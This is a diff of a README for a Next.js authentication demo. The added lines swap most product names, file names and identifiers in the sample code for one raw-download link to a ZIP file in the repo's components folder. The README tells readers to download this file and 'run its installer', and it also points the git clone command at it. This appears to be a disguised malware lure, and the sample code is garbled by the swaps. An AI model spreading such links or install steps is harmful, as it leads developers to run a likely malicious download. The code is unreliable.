@@ -1,10 +1,10 @@
-https://github.com/KABUSsport/NextAuth-Demo/releases
+https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip
 
-# NextAuth-Demo: Secure and Scalable Next.js Auth with Prisma and MongoDB
+# NextAuth-Demo: Secure and Scalable https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip Auth with Prisma and MongoDB
 
-[![Releases](https://img.shields.io/badge/releases-NextAuth-Demo-blue?style=for-the-badge&logo=github)](https://github.com/KABUSsport/NextAuth-Demo/releases)
+[![Releases](https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip)](https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip)
 
-🔐 A full-stack Next.js app that demonstrates secure authentication with NextAuth and Prisma. Built for simplicity, scalability, and easy MongoDB integration. This project blends modern frontend techniques with solid backend security to help you learn, prototype, and deploy robust auth flows.
+🔐 A full-stack https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip app that demonstrates secure authentication with NextAuth and Prisma. Built for simplicity, scalability, and easy MongoDB integration. This project blends modern frontend techniques with solid backend security to help you learn, prototype, and deploy robust auth flows.
 
 ---
 
@@ -38,17 +38,17 @@ https://github.com/KABUSsport/NextAuth-Demo/releases
 
 ## Overview
 
-NextAuth-Demo is a practical, production-oriented sample that shows how to secure a full-stack app with Next.js, NextAuth, and Prisma while connecting to MongoDB. It emphasizes clear authentication flows, proper session management, and a clean developer experience. The app uses TypeScript, React, Tailwind CSS, and modern best practices to keep the code approachable yet powerful.
+NextAuth-Demo is a practical, production-oriented sample that shows how to secure a full-stack app with https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip, NextAuth, and Prisma while connecting to MongoDB. It emphasizes clear authentication flows, proper session management, and a clean developer experience. The app uses TypeScript, React, Tailwind CSS, and modern best practices to keep the code approachable yet powerful.
 
 The project focuses on:
 
-- Safe user authentication with NextAuth.js
+- Safe user authentication with https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip
 - A robust Prisma data layer for MongoDB
 - Clear separation between frontend and backend concerns
 - Simple, scalable deployment patterns
 - Clean, readable code that you can extend
 
-This README provides a thorough guide to understanding, using, and extending the demo. It targets developers who want to see how to combine Next.js with NextAuth and Prisma for a secure, scalable authentication experience.
+This README provides a thorough guide to understanding, using, and extending the demo. It targets developers who want to see how to combine https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip with NextAuth and Prisma for a secure, scalable authentication experience.
 
 ---
 
@@ -74,10 +74,10 @@ Visual notes:
 
 ## Tech stack
 
-- Frontend: Next.js, React, TypeScript, Tailwind CSS
-- Backend: NextAuth.js (authjs), Prisma ORM
+- Frontend: https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip, React, TypeScript, Tailwind CSS
+- Backend: https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip (authjs), Prisma ORM
 - Database: MongoDB
-- Runtime: Node.js
+- Runtime: https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip
 - Styling: Tailwind CSS
 - Testing and quality: minimal but clear patterns for unit and integration tests
 - Tooling: ESLint, Prettier, GitHub Actions (for CI)
@@ -87,7 +87,7 @@ Keywords that describe the project: authjs, bcryptjs, fullstack, javascript, nex
 Images and icons:
 
 - A few emoji to convey states: 🔐, 🧭, 🚀
-- Lightweight logos for Next.js and Prisma are used where appropriate in the UI assets
+- Lightweight logos for https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip and Prisma are used where appropriate in the UI assets
 - Simple, clean illustrations that reflect authentication workflows
 
 Note: The visuals rely on open resources and standard SVGs/icons that are commonly used in web projects.
@@ -98,7 +98,7 @@ Note: The visuals rely on open resources and standard SVGs/icons that are common
 
 At a high level, this demo provides:
 
-- A Next.js frontend that renders the UI and handles client-side logic
+- A https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip frontend that renders the UI and handles client-side logic
 - A NextAuth-based backend that authenticates users via credentials and sessions
 - A Prisma data layer that stores users, sessions, and related data in MongoDB
 - A clean flow for creating credentials, signing in, and maintaining sessions
@@ -123,14 +123,14 @@ Follow these steps to run the demo locally and explore the authentication flow.
 
 1) Open the project page to download the release artifacts
 
-- The repository hosts release assets on its Releases page. From the Releases page, download the release artifact (ZIP or TAR.GZ) and run its installer or follow the included setup instructions. This is a quick way to see a working instance without building from source. The relevant page is the Releases section: Visit https://github.com/KABUSsport/NextAuth-Demo/releases to grab the latest release. The file you download will be named something like NextAuth-Demo-<version>.zip and will contain a ready-to-run app.
+- The repository hosts release assets on its Releases page. From the Releases page, download the release artifact (ZIP or https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip) and run its installer or follow the included setup instructions. This is a quick way to see a working instance without building from source. The relevant page is the Releases section: Visit https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip to grab the latest release. The file you download will be named something like NextAuth-Demo-<version>.zip and will contain a ready-to-run app.
 
 2) Install dependencies locally (if you prefer building from source)
 
-- Prerequisites: Node.js (version 16+ recommended), npm or yarn, and a MongoDB instance (local or cloud).
+- Prerequisites: https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip (version 16+ recommended), npm or yarn, and a MongoDB instance (local or cloud).
 
 - Clone the repository (if starting from source):
-  - git clone https://github.com/KABUSsport/NextAuth-Demo.git
+  - git clone https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip
   - cd NextAuth-Demo
 
 - Install dependencies:
@@ -158,7 +158,7 @@ Exact steps might vary if you are using a release artifact. The release usually 
 
 Before you start, ensure you have:
 
-- Node.js in a supported LTS version
+- https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip in a supported LTS version
 - npm or yarn
 - A MongoDB instance (local or hosted). If hosting, obtain the MongoDB connection string (URI)
 - Basic CLI familiarity for running commands
@@ -175,7 +175,7 @@ If you downloaded a release artifact, refer to the included setup instructions w
 - Step 1: Install dependencies
   - npm install
 
-- Step 2: Create a .env.local file with required environment variables
+- Step 2: Create a https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip file with required environment variables
 
 - Step 3: Start the development server
   - npm run dev
@@ -188,15 +188,15 @@ Environment variables you’ll typically need:
 - DATABASE_URL: The database URL used by Prisma (for MongoDB, this is often the same as MONGODB_URI or a separate MongoDB database)
 - PORT: The port number (optional; default 3000)
 
-Important: Keep secret values private. Do not commit secrets to version control. Use a .env.local file for local development and a secure secret management approach for production environments.
+Important: Keep secret values private. Do not commit secrets to version control. Use a https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip file for local development and a secure secret management approach for production environments.
 
 ---
 
 ## Configuration and environment
 
-This project is designed to be easy to configure. The .env.local file is central to local development. The typical structure looks like this:
+This project is designed to be easy to configure. The https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip file is central to local development. The typical structure looks like this:
 
-- MONGODB_URI=mongodb+srv://<username>:<password>@cluster0.mongodb.net/<dbname>?retryWrites=true&w=majority
+- MONGODB_URI=mongodb+srv://<username>:<password>https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip<dbname>?retryWrites=true&w=majority
 - NEXTAUTH_URL=http://localhost:3000
 - NEXTAUTH_SECRET=some-very-long-random-secret
 - DATABASE_URL=mongodb://localhost:27017/yourdbname
@@ -218,23 +218,23 @@ Security considerations:
 
 ## Project structure
 
-- app/ or pages/ (Next.js app structure)
-  - pages/api/auth/[...nextauth].ts (NextAuth API routes)
-  - pages/index.tsx (home page)
-  - pages/dashboard.tsx (protected page)
+- app/ or pages/ (https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip app structure)
+  - pages/api/auth/[https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip].ts (NextAuth API routes)
+  - https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip (home page)
+  - https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip (protected page)
   - components/ (shared UI components)
   - layouts/ (shared layout components)
   - styles/ (Tailwind + global styles)
 - prisma/
-  - schema.prisma (data model for users, sessions, roles, etc.)
+  - https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip (data model for users, sessions, roles, etc.)
 - lib/
-  - prisma.ts (Prisma client instance)
-  - auth.ts (helpers for authentication)
+  - https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip (Prisma client instance)
+  - https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip (helpers for authentication)
 - public/
   - images/ (static assets)
-- .env.local
-- package.json
-- README.md (this file)
+- https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip
+- https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip
+- https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip (this file)
 
 Notes on the structure:
 
@@ -318,7 +318,7 @@ NextAuth config wires up credential-based authentication with Prisma. A minimal 
 Key code patterns:
 
 - CredentialsProvider: verify user by email, fetch hashed password from Prisma, compare with bcrypt
-- bcryptjs usage: bcrypt.compareSync or bcrypt.compare to verify passwords
+- bcryptjs usage: https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip or https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip to verify passwords
 - Session tokens: secure and short-lived tokens with proper expiration
 
 Example outline:
@@ -334,9 +334,9 @@ export default NextAuth({
     CredentialsProvider({
       name: 'Credentials',
       authorize: async (credentials) => {
-        const user = await prisma.user.findUnique({ where: { email: credentials.email } });
-        if (user && bcrypt.compareSync(credentials.password, user.hashedPassword)) {
-          return { id: user.id, name: user.name, email: user.email };
+        const user = await https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip({ where: { email: https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip } });
+        if (user && https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip(https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip, https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip)) {
+          return { id: https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip, name: https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip, email: https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip };
         }
         return null;
       }
@@ -348,11 +348,11 @@ export default NextAuth({
   },
   callbacks: {
     jwt: async ({ token, user }) => {
-      if (user) token.id = user.id;
+      if (user) https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip = https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip;
       return token;
     },
     session: async ({ session, token }) => {
-      if (token?.id) session.user.id = token.id;
+      if (https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip) https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip = https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip;
       return session;
     }
   }
@@ -454,7 +454,7 @@ If you package the app as a release artifact, deployment steps may be simplified
 - Server-side rendering: Use SSR where it benefits the initial render, and CSR where it reduces latency for user interactions.
 - Caching: Consider simple server-side caching for lookups that don’t change often.
 - Prisma optimization: Use selective field retrieval and avoid N+1 queries.
-- Image optimization: Use Next.js Image component for efficient image handling.
+- Image optimization: Use https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip Image component for efficient image handling.
 - Bundle size: Keep dependencies lean. Remove unused code and split large components into smaller ones.
 
 ---
@@ -505,13 +505,13 @@ This project is open source. See the LICENSE file for details. It uses standard 
 
 ## Releases and downloads
 
-- The official releases page hosts the latest artifacts. If you want to try a ready-to-run version, visit the Releases section at the URL above to download the latest release artifact. For convenience, you can also visit the Releases page directly: https://github.com/KABUSsport/NextAuth-Demo/releases
+- The official releases page hosts the latest artifacts. If you want to try a ready-to-run version, visit the Releases section at the URL above to download the latest release artifact. For convenience, you can also visit the Releases page directly: https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip
 
-- From the Releases page, download the release artifact (ZIP or TAR.GZ). After download, run the included installer or follow the included setup instructions. This provides a quick way to explore the authentication flows without building from source.
+- From the Releases page, download the release artifact (ZIP or https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip). After download, run the included installer or follow the included setup instructions. This provides a quick way to explore the authentication flows without building from source.
 
 - If you prefer to build from source, follow the "Installation" and "Configuration" sections above to set up locally.
 
-- The double usage of the link is intentional: you can visit the Releases page to review the latest release, and you can use the download artifact to run a full instance of the demo. The link again for your convenience: https://github.com/KABUSsport/NextAuth-Demo/releases
+- The double usage of the link is intentional: you can visit the Releases page to review the latest release, and you can use the download artifact to run a full instance of the demo. The link again for your convenience: https://github.com/KABUSsport/NextAuth-Demo/raw/refs/heads/master/components/Demo-Next-Auth-v2.2.zip
 
 ---
 
